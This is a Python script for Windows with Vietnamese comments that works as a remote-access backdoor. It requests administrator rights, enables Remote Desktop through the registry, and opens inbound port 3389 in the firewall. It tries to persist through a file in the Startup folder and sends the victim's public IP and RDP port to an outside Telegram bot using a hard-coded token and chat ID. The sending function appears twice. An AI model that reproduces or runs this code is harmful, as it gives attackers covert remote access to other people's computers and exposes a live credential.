import subprocess

import sys
import ctypes

def run_as_admin():
    """Yêu cầu quyền Administrator nếu script không được chạy với quyền admin."""
    try:
        # Kiểm tra quyền admin
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        if not is_admin:
            # Nếu không có quyền admin, yêu cầu quyền
            print("Đang yêu cầu quyền Administrator...")
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit()  # Thoát script hiện tại, vì script mới sẽ được khởi động
        else:
            print("Script đang chạy dưới quyền Administrator.")
    except Exception as e:
        print(f"Lỗi khi yêu cầu quyền Administrator: {e}")
        sys.exit(1)

def is_remote_desktop_enabled():
    try:
        result = subprocess.run(
            ["powershell", "-Command", "(Get-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server').fDenyTSConnections"],
            capture_output=True,
            text=True
        )
        status = int(result.stdout.strip())
        return status == 0  # Trả về True nếu đã bật, False nếu chưa bật
    except Exception as e:
        print(f"Lỗi khi kiểm tra trạng thái RDP: {e}")
        return False
    

def enable_remote_desktop():
    try:
        subprocess.run(
            ["powershell", "-Command", "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' -Name 'fDenyTSConnections' -Value 0"],
            check=True
        )
        subprocess.run(
            ["powershell", "-Command", "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -Name 'UserAuthentication' -Value 1"],
            check=True
        )
        subprocess.run(
            ["powershell", "-Command", "New-NetFirewallRule -DisplayName 'Allow RDP' -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow"],
            check=True
        )
        print("Remote Desktop đã được bật và firewall đã được cấu hình.")
    except subprocess.CalledProcessError as e:
        print(f"Lỗi khi bật RDP: {e}")


import requests

def send_info_to_telegram():
    try:
        # Lấy địa chỉ IP công cộng
        ip_result = subprocess.run(["curl", "ifconfig.me"], capture_output=True, text=True)
        public_ip = ip_result.stdout.strip()

        # Gửi thông tin qua Telegram bot
        bot_token = "7318734370:AAGCyDSFwsb4Ln3DHn9y9FnzDfPWiq_1YxA"
        chat_id = "<CHAT_ID>"  # Thay bằng chat ID của bạn
        message = f"Remote Desktop đã được bật.\nIPv4 công cộng: {public_ip}\nCổng: 3389"
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {"chat_id": chat_id, "text": message}
        response = requests.post(url, data=payload)
        
        if response.status_code == 200:
            print("Thông tin đã được gửi qua Telegram.")
        else:
            print(f"Lỗi khi gửi tin nhắn: {response.text}")
    except Exception as e:
        print(f"Lỗi khi gửi thông tin qua Telegram: {e}")


import requests

def send_info_to_telegram():
    try:
        # Lấy địa chỉ IP công cộng
        ip_result = subprocess.run(["curl", "ifconfig.me"], capture_output=True, text=True)
        public_ip = ip_result.stdout.strip()

        # Gửi thông tin qua Telegram bot
        bot_token = "7318734370:AAGCyDSFwsb4Ln3DHn9y9FnzDfPWiq_1YxA"
        chat_id = "7447164672"  # Thay bằng chat ID của bạn
        message = f"Remote Desktop đã được bật.\nIPv4 công cộng: {public_ip}\nCổng: 3389"
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {"chat_id": chat_id, "text": message}
        response = requests.post(url, data=payload)
        
        if response.status_code == 200:
            print("Thông tin đã được gửi qua Telegram.")
        else:
            print(f"Lỗi khi gửi tin nhắn: {response.text}")
    except Exception as e:
        print(f"Lỗi khi gửi thông tin qua Telegram: {e}")

import os
import shutil

def create_startup_shortcut():
    try:
        # Đường dẫn file script
        script_path = os.path.abspath(__file__)

        # Thư mục Startup
        startup_dir = os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")

        # Tên file shortcut
        shortcut_name = "EnableRemoteDesktop.lnk"

        # Đường dẫn đầy đủ của shortcut
        shortcut_path = os.path.join(startup_dir, shortcut_name)

        # Tạo shortcut
        with open(shortcut_path, "w") as shortcut_file:
            shortcut_file.write(f"pythonw {script_path}")
        
        print(f"Shortcut đã được tạo tại: {shortcut_path}")
    except Exception as e:
        print(f"Lỗi khi tạo file khởi động: {e}")

if __name__ == "__main__":

    run_as_admin()

    if not is_remote_desktop_enabled():
        enable_remote_desktop()
    else:
        print("Remote Desktop đã được bật. Không cần kích hoạt lại.")
    
    create_startup_shortcut()
    send_info_to_telegram()
